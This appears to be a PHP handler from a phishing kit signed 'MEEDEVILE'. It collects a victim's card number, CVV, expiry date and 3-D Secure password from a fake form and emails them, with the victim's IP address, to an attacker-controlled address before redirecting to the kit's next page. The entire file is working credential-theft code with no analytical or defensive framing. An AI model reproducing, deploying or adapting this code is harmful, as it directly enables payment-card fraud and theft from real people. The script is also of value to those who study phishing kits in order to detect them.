<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$browzer = $_SERVER["HTTP_USER_AGENT"];
$message .= "==========[MEEDEVILE]=========<br>\n";
$message .= "|C-N-R	     : ".$_POST['card']."<br>\n";
$message .= "|C-V-V      : ".$_POST['cvc']."<br>\n";
$message .= "|E-X-P 	 : ".$_POST['Ex']."<br>\n";
$message .= "|3-D-P      : ".$_POST['3D']."<br>\n";
$message .= "===============[IP]==============<br>\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip<br>\n";
$message .= "==========[MEEDEVILE]=========<br>\n";

include '../e-mail.php';
$subject = "> CRD / VBV INFO =?UTF-8?Q?=E2=9C=94_?= $ip";
$headers = "From: ~MEEDEVILE~ <The.GrXn0v@support.com>";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\n";

mail($to, $subject, $message,$headers);

header("Location: ../don.php?IP=$ip");
?>
